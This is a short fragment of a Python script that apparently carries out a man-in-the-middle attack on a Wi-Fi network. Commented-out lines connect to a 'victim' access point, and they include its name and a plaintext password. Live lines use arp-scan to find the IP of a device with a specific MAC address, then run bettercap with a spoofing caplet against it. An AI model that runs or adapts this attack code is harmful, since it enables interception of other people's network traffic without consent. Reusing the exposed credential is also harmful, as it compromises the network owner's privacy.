...
#connect_vict_ap="nmcli d wifi connect 'Sherif' password 1993s1996n ifname wlan0"
#res=subprocess.run(connect_vict_ap, shell=True, capture_output=True, text=True)
#if not res.stderr:
 #   print(res.stdout, "connected to ap")
#to get ip of client
command="sudo arp-scan -l --interface wlan1 -T CA:31:14:92:FD:51 | sed -n '3p' | awk '{print $1}'"
while True:
...
os.system("sudo bettercap -iface wlan1 -caplet spoofbetter.cap")
